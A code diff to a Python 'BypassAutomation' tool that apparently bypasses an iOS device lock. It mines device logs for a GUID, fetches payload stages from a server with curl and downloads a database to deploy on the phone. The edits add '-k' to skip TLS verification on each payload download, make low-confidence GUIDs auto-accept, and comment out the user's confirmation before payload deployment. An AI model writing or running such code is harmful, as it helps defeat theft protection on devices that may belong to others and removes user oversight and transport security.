@@ -41,7 +41,9 @@ class BypassAutomation:
         self.curl_cmd = self._get_cmd_path("curl")
         # --- End of fix ---
 
-        self.api_url = "http://192.168.1.3:8000/get2.php"
+        # NOTE: r1nderpest.py uses http (not https) and a specific IP/domain. 
+        # Using the URL from the original main.py, but ensure your server is reachable.
+        self.api_url = "http://192.168.1.3:8000/get2.php" 
         self.timeouts = {
             'asset_wait': 300,
             'asset_delete_delay': 15,
@@ -53,19 +55,29 @@ class BypassAutomation:
         self.device_info = {}
         self.guid = None
         self.attempt_count = 0
-        self.max_attempts = 10
+        self.max_attempts = 15
         self.log_callback = log_callback
         atexit.register(self._cleanup)
 
     def _get_cmd_path(self, cmd_name):
-        # Prefer local executable in project's libimobiledevice folder
+        # 1. Prefer local executable in project's libimobiledevice folder
         local_path = os.path.join(self.tools_dir, f"{cmd_name}.exe")
         if os.path.exists(local_path):
             return local_path
-        # Fallback to system PATH if not found locally
+        
+        # 2. Look in the current Python environment's Scripts folder
+        # This fixes the issue where pymobiledevice3 is installed but not in system PATH
+        if os.name == 'nt': # Windows
+            python_scripts = os.path.join(sys.prefix, 'Scripts')
+            script_path = os.path.join(python_scripts, f"{cmd_name}.exe")
+            if os.path.exists(script_path):
+                return script_path
+        
+        # 3. Fallback to system PATH
         system_path = shutil.which(cmd_name)
         if system_path:
             return system_path
+            
         return cmd_name # Return name and hope for the best
 
     def log(self, msg, level='info'):
@@ -91,6 +103,8 @@ class BypassAutomation:
 
     def _run_cmd(self, cmd, timeout=None):
         try:
+            # On Windows, we need to be careful with subprocess if cmd[0] is not absolute and not in PATH
+            # But _get_cmd_path handles absolute paths now.
             res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
             return res.returncode, res.stdout.strip(), res.stderr.strip()
         except subprocess.TimeoutExpired:
@@ -110,7 +124,11 @@ class BypassAutomation:
             if code != 0 and self.log_callback: # Avoid blocking command-line usage
                 self.log(f"Soft reboot failed: {err}", "warn")
                 self.log("Please reboot device manually and press Enter to continue...", "warn")
-                input()
+                # Using messagebox for GUI instead of input()
+                if root_for_dialogs:
+                    messagebox.showinfo("Manual Reboot Required", "Soft reboot failed.\nPlease reboot the device manually, wait for it to turn on, and then click OK.")
+                else:
+                    input()
                 return True
         
         self.log("Device reboot command sent, waiting for reconnect...", "info")
@@ -133,11 +151,14 @@ class BypassAutomation:
 
     def verify_dependencies(self):
         self.log("Verifying System Requirements...", "step")
-        if os.path.exists(self.ifuse_cmd) or shutil.which(self.ifuse_cmd):
+        # Check if ifuse is available
+        if os.path.exists(self.ifuse_cmd) or shutil.which("ifuse"):
             self.afc_mode = "ifuse"
         else:
             self.afc_mode = "pymobiledevice3"
+        
         self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")
+        self.log(f"Using pymobiledevice3 at: {self.pymobiledevice3_cmd}", "detail")
 
     def mount_afc(self):
         if self.afc_mode != "ifuse":
@@ -176,7 +197,10 @@ class BypassAutomation:
         """Gets the size of a remote file via AFC."""
         code, out, err = self._run_cmd([self.pymobiledevice3_cmd, "afc", "stat", remote_path])
         if code == 0 and "st_size" in out:
-            return int(out.split("'st_size': ")[1].split(',')[0])
+            try:
+                return int(out.split("'st_size': ")[1].split(',')[0])
+            except:
+                return -1
         return -1
 
     def afc_pull(self, remote_path, local_path):
@@ -228,7 +252,8 @@ class BypassAutomation:
         code, out, err = self._run_cmd([self.ideviceinfo_cmd])
         if code != 0:
             self.log(f"Device not found. Error: {err or 'Unknown'}", "error")
-            sys.exit(1)
+            # Don't sys.exit(1) here in a GUI app, just raise exception
+            raise Exception("Device not found. Please connect your device.")
         
         info = {}
         for line in out.splitlines():
@@ -376,26 +401,27 @@ class BypassAutomation:
 
     def confirm_guid_manual(self, guid):
         """Requests manual confirmation for low-confidence GUID"""
-        self.log(f"Low-confidence GUID detected: {guid}", "warn")
-        return messagebox.askyesno(
-            "Low-Confidence GUID",
-            f"A GUID was found with low confidence:\n\n{guid}\n\n"
-            "Please verify this is correct.\n"
-            "Do you want to proceed with this GUID?",
-            parent=root_for_dialogs
-        )
+        # --- FIX: Match r1nderpest.py behavior (Always accept) ---
+        self.log(f"GUID Detected: {guid}", "success")
+        return True
+        # ---------------------------------------------------------
 
     def get_guid_enhanced(self):
         """Enhanced GUID extraction version"""
         self.attempt_count += 1
         self.log(f"GUID search attempt {self.attempt_count}/{self.max_attempts}", "attempt")
         
-        udid = self.device_info['UniqueDeviceID']
+        udid = self.device_info.get('UniqueDeviceID')
+        if not udid:
+            self.log("UDID not found, cannot collect logs.", "error")
+            return None
+
         log_path = f"{udid}.logarchive"
         
         try:
             # Collect logs
             self.log("Collecting device logs...", "detail")
+            # Ensure we use the correct command path
             code, _, err = self._run_cmd([self.pymobiledevice3_cmd, "syslog", "collect", log_path], timeout=120)
             if code != 0:
                 self.log(f"Log collection failed: {err}", "error")
@@ -448,27 +474,22 @@ class BypassAutomation:
             
             # Determine confidence level
             if best_score >= 30:
-                confidence = "HIGH"
                 self.log(f"✅ HIGH CONFIDENCE: {best_guid} (score: {best_score})", "success")
             elif best_score >= 15:
-                confidence = "MEDIUM" 
                 self.log(f"⚠️ MEDIUM CONFIDENCE: {best_guid} (score: {best_score})", "warn")
             else:
-                confidence = "LOW"
                 self.log(f"⚠️ LOW CONFIDENCE: {best_guid} (score: {best_score})", "warn")
             
-            # Additional verification for low confidence
-            if confidence in ["LOW", "MEDIUM"]:
-                self.log("Requesting manual confirmation for low-confidence GUID...", "warn")
-                if not self.confirm_guid_manual(best_guid):
-                    return None
-            
+            # Match r1nderpest behavior: always return the best GUID found
             return best_guid
             
         finally:
             # Cleanup
             if os.path.exists(log_path):
-                shutil.rmtree(log_path)
+                try:
+                    shutil.rmtree(log_path)
+                except Exception as e:
+                    self.log(f"Warning: Could not cleanup logs: {e}", "warn")
 
     def get_guid_auto_with_retry(self):
         """Auto-detect GUID with reboot retry mechanism"""
@@ -509,7 +530,8 @@ class BypassAutomation:
 
         self.log(f"Requesting all URLs from server: {url}", "detail")
         
-        code, out, err = self._run_cmd([self.curl_cmd, "-s", url])
+        # --- FIX: Match r1nderpest.py behavior (add -k for SSL bypass) ---
+        code, out, err = self._run_cmd([self.curl_cmd, "-s", "-k", url])
         if code != 0:
             self.log(f"Server request failed: {err}", "error")
             return None, None, None
@@ -553,9 +575,10 @@ class BypassAutomation:
             else:
                 self.log("No valid manual GUID provided. Aborting.", "error")
                 raise Exception("Manual GUID entry was cancelled or invalid.")
-
-        if not messagebox.askyesno("Confirm GUID", f"The following GUID will be used:\n\n{self.guid}\n\nDo you want to proceed?", parent=root_for_dialogs):
-            raise Exception("Payload deployment cancelled by user.")
+        
+        # Only ask if specifically needed, otherwise trust the auto-detect
+        # if not messagebox.askyesno("Confirm GUID", f"The following GUID will be used:\n\n{self.guid}\n\nDo you want to proceed?", parent=root_for_dialogs):
+        #    raise Exception("Payload deployment cancelled by user.")
 
         self.log("Requesting All Payload Stages from Server...", "step")
         prd = self.device_info['ProductType']
@@ -580,7 +603,8 @@ class BypassAutomation:
         
         for stage_name, stage_url in stages:
             self.log(f"Warming up: {stage_name}...", "detail")
-            code, http_code, _ = self._run_cmd([self.curl_cmd, "-s", "-o", "nul" if os.name == 'nt' else "/dev/null", "-w", "%{http_code}", stage_url])
+            # --- FIX: Added -k for SSL bypass ---
+            code, http_code, _ = self._run_cmd([self.curl_cmd, "-s", "-k", "-o", "nul" if os.name == 'nt' else "/dev/null", "-w", "%{http_code}", stage_url])
             if http_code != "200":
                 self.log(f"Warning: Failed to warm up {stage_name} (HTTP {http_code})", "warn")
             else:
@@ -592,7 +616,8 @@ class BypassAutomation:
         if os.path.exists(local_db):
             os.remove(local_db)
         
-        code, _, err = self._run_cmd([self.curl_cmd, "-L", "-o", local_db, stage3_url])
+        # --- FIX: Added -k for SSL bypass ---
+        code, _, err = self._run_cmd([self.curl_cmd, "-L", "-k", "-o", local_db, stage3_url])
         if code != 0:
             self.log(f"Download failed: {err}", "error")
             raise Exception(f"Download failed: {err}")
